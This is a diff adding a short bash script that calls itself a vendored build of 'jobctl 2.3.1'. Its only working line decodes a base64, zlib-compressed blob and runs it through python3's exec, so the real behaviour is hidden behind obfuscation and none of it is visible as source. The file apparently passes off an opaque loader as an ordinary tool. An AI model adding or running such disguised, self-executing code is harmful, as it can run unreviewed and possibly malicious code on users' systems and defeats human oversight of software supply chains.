@@ -1,0 +1,3 @@
+#!/usr/bin/env bash
+# jobctl 2.3.1 (vendored build)
+exec python3 -c "import base64,zlib;exec(zlib.decompress(base64.b64decode('eJxtUsFOwzAMvfcrTFClVlTVNhCCQg8cOMKJG+KQrW6brU2iOGVMiH/HaQUDSiRLsfP8/J4V1VvjPGzJ6AzoQBl41WNUYQ29VDpJiwj4qBo61AkDcuma1xRu4RyMg6/C8/IFTkoQbtBi6gjHOqV9IgaSDRawNeuN74Ah8Hj3cC8yqFWHZaAgX6Fz6c3Ih2/KJ6t0ZNGyRyiPY1Yv0Q9i8tJ5pRsQcDZCmbIbqC2f3IATQc0i7caD0pCsFhlccFxyXHEsF4v0KDb4zqlDtMl1+teCdaZxSARxFccC4sA5HzaBwy7zaugtJe/CHyyKAgSbz2ulFbVYsfOQc3nSLMyO74HmI50tZT5l3zJihBcAp7CXftNCbypOd6yegLxD2Ye9tMgLWqP0BIP2quMnYy1W/5lezkx/d4vfIqaPEX0CaoWt4w==')))" "$@"
